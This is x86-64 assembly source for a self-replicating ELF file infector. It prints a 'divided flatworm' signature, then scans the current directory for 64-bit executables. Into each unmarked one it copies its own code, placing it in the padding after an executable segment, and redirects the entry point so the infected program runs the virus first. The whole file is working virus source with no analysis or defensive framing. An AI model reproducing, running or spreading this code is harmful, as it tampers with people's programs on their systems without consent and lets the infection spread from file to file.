bits 64
section .text
default rel

%define sys_write       1
%define sys_open        2
%define sys_close       3
%define sys_fstat       5
%define sys_mmap        9
%define sys_munmap      11
%define sys_exit        60
%define sys_getdents64  217

struc elf64_ehdr
.e_ident        resb    16
.e_type         resw    1
.e_machine      resw    1
.e_version      resd    1
.e_entry        resq    1
.e_phoff        resq    1
.e_shoff        resq    1
.e_flags        resd    1
.e_ehsize       resw    1
.e_phentsize    resw    1
.e_phnum        resw    1
.e_shentsize    resw    1
.e_shnum        resw    1
.e_shstrndx     resw    1
.sizeof         resb    1
endstruc

struc elf64_phdr
.p_type         resd    1
.p_flags        resd    1
.p_offset       resq    1
.p_vaddr        resq    1
.p_paddr        resq    1
.p_filesz       resq    1
.p_memsz        resq    1
.p_align        resq    1
.sizeof         resb    1
endstruc

struc stat
.st_dev         resq    1
.st_ino         resq    1
.st_nlink       resq    1
.st_mode        resd    1
.st_uid         resd    1
.st_gid         resd    1
.pad0           resb    4
.st_rdev        resq    1
.st_size        resq    1
.st_blksize     resq    1
.st_blocks      resq    1
.st_atime       resq    1
.st_atime_nsec  resq    1
.st_mtime       resq    1
.st_mtime_nsec  resq    1
.st_ctime       resq    1
.st_ctime_nsec  resq    1
.sizeof         resb    1
endstruc

global _start
_start:
    push rbx
    push rdx
    push rsi
    push r12
    push r13

    ; The divided flatworm lives in coral reefs in the tropical waters.
    mov rdi, 0x1 ; stdout
    lea rsi, [rel signature]
    mov rdx, signature_len
    mov rax, sys_write
    syscall

    ; open target directory
    lea rdi, [rel dir]
    xor rsi, rsi ; O_RDONLY
    mov rax, sys_open
    syscall

    ; read directory, store dirent buffer on the stack
    mov rdi, rax
    mov rax, sys_getdents64
    sub rsp, 8192
    mov rsi, rsp
    mov rdx, 8192
    syscall
    test rax, rax
    jle end_routine

    ; r12 = pointer to dirent buffer
    ; r13 = r12 + bytes read
    mov r12, rsp
    mov r13, rsp
    add r13, rax

next_entry:
    cmp r12, r13
    jge end_routine

    mov al, [r12 + 18] ; d_type
    movzx rdx, word [r12 + 16] ; d_reclen
    lea rdi, [r12 + 19] ; d_name

    ; move our pointer to next entry
    add r12, rdx

    cmp al, 0x8 ; DT_REG
    jne next_entry

    mov rsi, 0x2 ; O_RDWR
    mov rax, sys_open
    syscall

    ; check if open failed
    cmp rax, 0
    jle next_entry

    ; get info
    sub rsp, stat.sizeof ; make room for stat
    mov rdi, rax
    mov rsi, rsp
    mov rax, sys_fstat
    syscall

    ; mmap file
    mov rsi, [rsp + stat.st_size]
    add rsp, stat.sizeof ; free room for stat
    mov r8, rdi
    xor rdi, rdi
    mov rdx, 0x3 ; PROT_READ | PROT_WRITE
    mov r10, 0x1 ; MAP_SHARED
    xor r9, r9
    mov rax, sys_mmap
    syscall

    ; check if ELF64
    cmp dword [rax], 0x464c457f
    jne next_entry
    cmp byte [rax + 0x4], 0x2
    jne next_entry

    ; check if worm is already present
    mov rdi, rax
    add rdi, [rax + elf64_ehdr.e_entry]
    cmp dword [rdi + sig_offset], 0x20656854
    jne infect
    jmp next_entry

infect:
    ; find target program header
    mov rdi, rax
    add rax, [rdi + elf64_ehdr.e_phoff]
    movzx rbx, word [rdi + elf64_ehdr.e_phnum]
    xor rdx, rdx

p_hdr_loop:
    cmp dword [rax + elf64_phdr.p_type], 0x1  ; PT_LOAD
    jne inadequate_p_hdr

    test byte [rax + elf64_phdr.p_flags], 0x4 ; PF_R
    jz inadequate_p_hdr

    test byte [rax + elf64_phdr.p_flags], 0x1 ; PF_X
    jz inadequate_p_hdr
    jmp adequate_p_hdr

inadequate_p_hdr:
    add rax, elf64_phdr.sizeof
    inc rdx
    cmp rdx, rbx
    jl p_hdr_loop
    jmp next_entry

adequate_p_hdr:
    mov rsi, rdi
    add rsi, [rax + elf64_phdr.p_offset]
    add rsi, [rax + elf64_phdr.p_filesz]
    xor rbx, rbx

zero_space_loop:
    ; check for empty space
    mov cl, byte [rsi + rbx]
    cmp cl, 0
    je zero_found
    jmp next_entry

zero_found:
    inc rbx
    cmp rbx, code_size
    jl zero_space_loop

    ; enough space to replicate our code
    lea rbx, [rel _start]
    xor rdx, rdx

copy_loop:
    mov cl, [rbx]
    mov [rsi], cl
    inc rbx
    inc rsi
    inc rdx
    cmp rdx, code_size
    jl copy_loop

    ; compute & set end routine jmp offset
    mov rsi, [rax + elf64_phdr.p_vaddr]
    add rsi, [rax + elf64_phdr.p_filesz]
    mov rbx, [rdi + elf64_ehdr.e_entry]
    sub rbx, rsi
    sub rbx, jmp_offset
    sub rbx, 5
    mov rsi, rdi
    add rsi, [rax + elf64_phdr.p_offset]
    add rsi, [rax + elf64_phdr.p_filesz]
    add rsi, jmp_offset
    mov dword [rsi+1], ebx

    ; set entry point
    mov rsi, [rax + elf64_phdr.p_vaddr]
    add rsi, [rax + elf64_phdr.p_filesz]
    mov [rdi + elf64_ehdr.e_entry], rsi

    ; adjust sizes
    mov rsi, [rax + elf64_phdr.p_filesz]
    add rsi, code_size
    mov [rax + elf64_phdr.p_filesz], rsi
    mov rsi, [rax + elf64_phdr.p_memsz]
    add rsi, code_size
    mov [rax + elf64_phdr.p_memsz], rsi

    jmp next_entry

end_routine:
    add rsp, 8192
    pop r13
    pop r12
    pop rsi
    pop rdx
    pop rbx
end_jmp:
    jmp +4 ; value overwritten when replicating code

dir:
    db ".", 0x0
signature:
    db "The divided flatworm lives in coral reefs in the tropical waters.", 0xa, 0x0
signature_len equ $ - signature
code_size equ $ - _start
jmp_offset equ end_jmp - _start
sig_offset equ signature - _start
